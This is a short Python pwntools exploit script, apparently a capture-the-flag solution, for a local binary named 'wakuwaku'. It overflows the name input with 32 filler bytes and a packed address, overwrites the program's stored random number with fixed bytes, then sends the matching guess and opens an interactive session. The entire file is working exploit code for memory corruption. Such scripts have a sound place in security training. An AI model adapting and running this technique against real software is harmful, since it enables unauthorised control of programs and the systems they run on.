from pwn import *





random_adr = p64(0x0000000000405ff8)  # Address that saving random number

payload = b""
payload += b"\x01" * 32
payload += random_adr

new_random_num = b"\x01\x01\x01\x01\x01\x01\x01\x01"  # Cover 


# Start process
p = process("./wakuwaku")


# Stop there and attached with gdb
raw_input() # In python standard library, used for wating input


# Start to inject
p.recvuntil(b"What's your name ?\nName: ")
p.sendline(payload)

p.recvuntil(b"Place your bets (minimum is $10000) : ")
p.sendline(new_random_num)

p.recvuntil(b"Guess your number (ans betwwen 0~999) : ")
p.sendline(random_adr)

p.interactive()


